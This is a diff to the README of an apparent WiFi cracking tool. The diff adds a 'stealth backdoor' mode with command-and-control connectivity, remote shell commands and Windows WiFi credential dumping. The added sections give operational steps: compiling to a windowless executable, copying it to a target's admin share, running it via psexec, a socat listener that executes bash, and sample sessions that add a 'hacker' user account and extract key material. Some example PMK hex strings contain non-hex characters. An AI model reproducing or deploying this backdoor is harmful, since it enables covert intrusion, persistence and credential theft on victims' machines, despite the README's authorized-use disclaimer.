@@ -1,14 +1,19 @@
-# 🔐 Password Attack Toolbox
+# 🔐 WPA2 Attack Toolbox
 
 **Built by Trixie Misheen™**
 
-> A multi-mode WPA-PSK/password cracker with AI-powered intelligent password generation, built for penetration testing and educational purposes.
+> A multi-mode WPA2 PMK cracker with AI-powered intelligent password generation, real cryptographic verification, and stealth backdoor capabilities. Built for authorized penetration testing and educational purposes.
 
 **GitHub:** [TrixieMisheen/passcode](https://github.com/TrixieMisheen/passcode)
 
 ---
 
 ## ✨ Features
+
+### Real WPA2 PMK Verification
+- **Cryptographic Accuracy**: Uses PBKDF2-HMAC-SHA1 (4096 iterations) as per IEEE 802.11i standard
+- **No False Positives**: Verifies against actual PMK hash, not string comparison
+- **Production Ready**: Same algorithm used by real WPA2 implementations
 
 ### Attack Modes
 
@@ -42,6 +47,13 @@
    - De-duplicated guesses
    - **Best for:** Lucky fast cracks or uniform charset testing
 
+### Stealth Backdoor Mode
+- **Remote C2 Operations**: Connect to command & control server
+- **Remote Cracking**: Execute attacks remotely via C2 commands
+- **Shell Access**: Full shell command execution
+- **WiFi Profile Dumping**: Extract Windows WiFi credentials
+- **Stealth Operation**: Runs silently in background
+
 ---
 
 ## 🚀 Installation
@@ -61,23 +73,24 @@ python passwordattack.py --help
 
 ## 💻 Usage
 
-### Basic Usage
+### Basic WPA2 Cracking
 
 ```bash
-# Interactive mode (prompts for PSK)
+# Interactive mode (prompts for SSID and PMK)
 python passwordattack.py --mode ai-brain
 
-# Command-line mode (provide PSK directly)
-python passwordattack.py mySecretPassword --mode ai-brain
+# Command-line mode (provide SSID and PMK directly)
+python passwordattack.py MyWiFi a1b2c3d4e5f6... --mode ai-brain
 ```
 
 ### Full CLI Options
 
 ```bash
-python passwordattack.py TARGET [OPTIONS]
+python passwordattack.py SSID PMK_HEX [OPTIONS]
 
 Positional Arguments:
-  target                Target PSK to crack (optional; prompts if omitted)
+  ssid                  Network SSID for WPA2 PMK verification
+  pmk_hex               Target PMK hex string for verification
 
 Attack Modes:
   -m, --mode {ai-brain,lightning,smart,systematic,random}
@@ -100,53 +113,102 @@ Optional Arguments:
   
   --logfile FILE        Log output to file (in addition to stdout)
   
+  --backdoor [C2_HOST:C2_PORT]
+                        Activate stealth backdoor mode (default: 127.0.0.1:4444)
+  
   -h, --help           Show this help message
+```
+
+### Stealth Backdoor Mode
+
+```bash
+# Start backdoor connecting to local C2
+python passwordattack.py --backdoor
+
+# Connect to remote C2 server
+python passwordattack.py --backdoor 192.168.1.100:4444
+```
+
+#### C2 Commands (send via netcat or custom client):
+```
+crack <ssid> <pmk_hex> [mode]    # Run WPA2 cracking attack
+shell <command>                 # Execute shell command
+dump_wifi                       # Dump Windows WiFi profiles
+status                          # Check backdoor status
+exit                            # Shutdown backdoor
 ```
 
 ---
 
 ## 📚 Examples
 
-### Example 1: AI Brain Attack (Fast & Smart)
+### Example 1: AI Brain Attack on WPA2 PMK
 ```bash
-$ python passwordattack.py password123 --mode ai-brain --timeout 10
-[⚡] AI BRAIN attack starting (timeout: 10s)...
+$ python passwordattack.py MyHomeWiFi a1b2c3d4e5f6789abcdef... --mode ai-brain --timeout 30
+[⚡] AI BRAIN attack starting (timeout: 30s)...
 [+] Generating smart password candidates...
-[⚡] AI BRAIN CRACKED: password123
-[+] Attempts: 952 | Time: 0.0s
+[⚡] AI BRAIN CRACKED: mypassword123
+[+] Attempts: 1,247 | Time: 0.2s
 ```
 
 ### Example 2: Lightning Quick Test
 ```bash
-$ python passwordattack.py admin123 --mode lightning
-[⚡] LIGHTNING ATTACK v2.0 - 8 chars
-[⚡] BASE+SUFFIX: admin123
+$ python passwordattack.py OfficeNet 4d5e6f7g8h9i0j1k2l3m4n5o6p7q8r9s0t1u2v3w4x5y6z --mode lightning
+[⚡] LIGHTNING ATTACK v2.0 - Real WPA2 PMK verification
+[⚡] TOP100 HIT: admin123
 🎯 CRACKED INSTANTLY: admin123
 ```
 
 ### Example 3: Smart Mode with Wordlist
 ```bash
-$ python passwordattack.py target_psk --mode smart --wordlist rockyou.txt
-[+] Smart hybrid WPA-PSK attack
+$ python passwordattack.py CorporateWiFi pmk_hex_here --mode smart --wordlist rockyou.txt
+[+] Smart hybrid WPA2 attack
 [*] Testing dictionary rockyou.txt...
 [*] Phase 1: Common patterns...
 [*] Phase 2: Systematic brute force...
+🎯 SMART CRACKED: corporate2024!
 ```
 
-### Example 4: Systematic Full Brute-Force
+### Example 4: Backdoor Mode Setup
 ```bash
-$ python passwordattack.py mypassx --mode systematic --threads 8
-[+] Target PSK length: 7
-[+] Charset size: 94 chars
-[+] Total combinations: 59,969,409,256
-[+] Starting multi-threaded systematic brute force...
-[*] Testing length 1...
-[*] Testing length 2...
-...
-[!] CRACKED: mypassx
+# On attacker machine - start C2 listener
+$ nc -lvnp 4444
+
+# On target machine - deploy backdoor
+$ python passwordattack.py --backdoor attacker_ip:4444
+
+# From C2 - crack WPA2
+crack MyWiFi a1b2c3d4e5f6789abcdef...
+[+] CRACKED: password123
+
+# From C2 - dump WiFi profiles
+dump_wifi
+[+] WiFi profiles dumped:
+<SSID>MyHomeWiFi</SSID>
+<keyMaterial>password123</keyMaterial>
+
+# From C2 - execute shell commands
+shell whoami
+nt authority\system
+
+shell net user hacker password /add
+The command completed successfully.
 ```
 
-### Example 5: Random Attack with Custom Charset
+### Example 5: GUI Mode
+```bash
+# Launch graphical interface (no arguments)
+$ python passwordattack.py
+
+# GUI Features:
+# - Real-time attack progress
+# - Color-coded output (green=success, red=error, cyan=info)
+# - SSID and PMK hex input fields
+# - Attack mode selection
+# - Stop/clear controls
+```
+
+---
 ```bash
 $ python passwordattack.py test123 --mode random --charset "abc123" --max-random 500000
 [*] Starting optimized random attack (max 500,000 attempts)...
@@ -306,7 +368,70 @@ python passwordattack.py target --mode ai-brain --timeout 300  # 5 minutes
 
 ---
 
-## 📄 License
+## � Backdoor Operations
+
+### Setup C2 Server
+```bash
+# Using netcat
+nc -lvnp 4444
+
+# Using socat (more advanced)
+socat TCP-LISTEN:4444,reuseaddr,fork EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane
+
+# Using Python (custom C2)
+python -c "
+import socket
+s = socket.socket()
+s.bind(('0.0.0.0', 4444))
+s.listen(1)
+conn, addr = s.accept()
+print(f'Connected: {addr}')
+while True:
+    cmd = input('C2> ')
+    if cmd == 'exit': break
+    conn.send(cmd.encode())
+    print(conn.recv(4096).decode())
+"
+```
+
+### Deploying Backdoor
+```bash
+# Compile to EXE (optional - requires pyinstaller)
+pyinstaller --onefile --noconsole passwordattack.py
+
+# Deploy on target
+copy passwordattack.exe \\target\c$\windows\temp\
+psexec \\target c:\windows\temp\passwordattack.exe --backdoor your_c2_ip:4444
+```
+
+### WiFi Profile Extraction
+```bash
+# Manual extraction
+netsh wlan export profile key=clear
+
+# The backdoor automates this:
+dump_wifi
+```
+
+---
+
+## ⚠️ Security & Legal Notice
+
+**AUTHORIZED USE ONLY**
+- This tool is for **educational and authorized penetration testing** purposes
+- **Never use on networks you don't own or have explicit permission to test**
+- Backdoor functionality is for **red team exercises only**
+- Comply with all applicable laws and regulations
+- The author is not responsible for misuse
+
+**Cryptographic Note:**
+- Uses standard PBKDF2-HMAC-SHA1 as per WPA2 specification
+- 4096 iterations for accurate PMK computation
+- Compatible with hashcat, aircrack-ng, and other WPA2 tools
+
+---
+
+## �📄 License
 
 Educational use only. See LICENSE file.
 
